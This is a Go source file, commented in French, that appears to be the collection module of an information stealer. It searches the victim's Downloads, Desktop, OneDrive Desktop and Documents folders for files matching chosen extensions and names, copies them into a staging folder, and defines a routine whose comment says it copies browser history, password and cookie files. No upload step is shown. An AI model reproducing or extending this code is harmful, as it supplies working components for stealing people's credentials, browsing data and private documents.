package getdata

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

// Copier un fichier
func CopyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	return nil
}

// Obtenir les fichiers d'un répertoire selon une liste d'extensions et de noms
func GetFiles(dir string, extensions, names []string) ([]string, error) {
	var result []string

	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			for _, ext := range extensions {
				if strings.HasSuffix(info.Name(), ext) {
					for _, name := range names {
						if strings.Contains(info.Name(), name) {
							result = append(result, path)
							break
						}
					}
				}
			}
		}
		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("erreur lors de la recherche des fichiers : %v", err)
	}

	return result, nil
}

// ProcessData traite les données des navigateurs et les fichiers utilisateurs
func ProcessData(dataFolder string, extensions, names []string) error {
	// Créer le dossier DATA s'il n'existe pas
	if _, err := os.Stat(dataFolder); os.IsNotExist(err) {
		err := os.Mkdir(dataFolder, 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du dossier DATA : %v", err)
		}
	}

	// Créer le dossier Navigateurs s'il n'existe pas
	browsersFolder := filepath.Join(dataFolder, "Navigateurs")
	if _, err := os.Stat(browsersFolder); os.IsNotExist(err) {
		err := os.Mkdir(browsersFolder, 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du dossier Navigateurs : %v", err)
		}
	}

	// Copier les fichiers des répertoires utilisateur
	err := CopyFilesToUserDirectories(dataFolder, extensions, names)
	if err != nil {
		return fmt.Errorf("erreur lors de la copie des fichiers : %v", err)
	}

	return nil
}

// processBrowserFiles traite et copie les fichiers spécifiques (historique, mots de passe, cookies) pour un navigateur donné
func processBrowserFiles(browser, browserFolder string, getFilePaths func(string) ([]string, error), fileType string) error {
	filePaths, err := getFilePaths(browser)
	if err != nil {
		return fmt.Errorf("erreur lors de la récupération des fichiers %s pour %s : %v", fileType, browser, err)
	}

	for _, filePath := range filePaths {
		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
		} else {
			fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)

			destination := filepath.Join(browserFolder, filepath.Base(filePath))
			err := CopyFile(filePath, destination)
			if err != nil {
				fmt.Printf("Erreur lors de la copie du fichier %s de %s : %v\n", fileType, browser, err)
			} else {
				fmt.Printf("Le fichier %s de %s a été copié dans %s\n", fileType, browser, destination)
			}
		}
	}
	return nil
}

func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) error {
	userHome, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	oneDriveDesktop := filepath.Join(userHome, "OneDrive", "Desktop")

	directories := []string{
		filepath.Join(userHome, "Downloads"),
		filepath.Join(userHome, "Desktop"),
		oneDriveDesktop,
		filepath.Join(userHome, "Documents"),
	}

	subFolders := []string{"Downloads", "Desktop", "Documents", "Navigateurs"}
	for _, folder := range subFolders {
		err := os.MkdirAll(filepath.Join(dataFolder, folder), 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du sous-dossier %s : %v", folder, err)
		}
	}

	var wg sync.WaitGroup

	for _, dir := range directories {
		wg.Add(1)

		go func(dir string) {
			defer wg.Done()

			fmt.Printf("Recherche de fichiers dans : %s\n", dir)

			files, err := GetFiles(dir, extensions, names)
			if err != nil {
				fmt.Printf("Erreur lors de la récupération des fichiers dans %s : %v\n", dir, err)
				return
			}

			for _, filePath := range files {
				fileName := filepath.Base(filePath)
				var destinationDir string

				switch {
				case strings.HasPrefix(filePath, filepath.Join(userHome, "Downloads")):
					destinationDir = filepath.Join(dataFolder, "Downloads")
				case strings.HasPrefix(filePath, filepath.Join(userHome, "Desktop")):
					destinationDir = filepath.Join(dataFolder, "Desktop")
				case strings.HasPrefix(filePath, oneDriveDesktop):
					destinationDir = filepath.Join(dataFolder, "Desktop")
				case strings.HasPrefix(filePath, filepath.Join(userHome, "Documents")):
					destinationDir = filepath.Join(dataFolder, "Documents")
				}

				destination := filepath.Join(destinationDir, fileName)

				err := CopyFile(filePath, destination)
				if err != nil {
					fmt.Printf("Erreur lors de la copie de %s : %v\n", filePath, err)
				} else {
					fmt.Printf("Fichier %s copié dans %s\n", fileName, destinationDir)
				}
			}
		}(dir)
	}

	wg.Wait()
	return nil
}
